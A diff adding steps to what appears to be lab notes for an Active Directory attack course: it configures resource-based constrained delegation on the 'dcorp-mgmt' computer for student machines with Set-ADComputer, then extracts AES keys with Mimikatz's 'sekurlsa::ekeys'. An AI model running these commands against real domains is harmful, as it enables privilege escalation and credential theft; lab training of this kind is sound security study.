@@ -487,3 +487,17 @@ Find-InterestingDomainACL | ?{$_.identityreferencename -match 'ciadmin'}
 ```
 
 
+- Using the ActiveDirectory module, configure RBCD on `dcorp-mgmt` for student machines :
+
+
+```powershell
+$comps = 'dcorp-student1$','dcorp-student2$' Set-ADComputer -Identity dcorp-mgmt -PrincipalsAllowedToDelegateToAccount $comps
+```
+
+
+- Now, let's get the privileges of `dcorp-studentx`$ by extracting its AES keys:
+
+
+```powershell
+Invoke-Mimikatz -Command '"sekurlsa::ekeys"'
+```
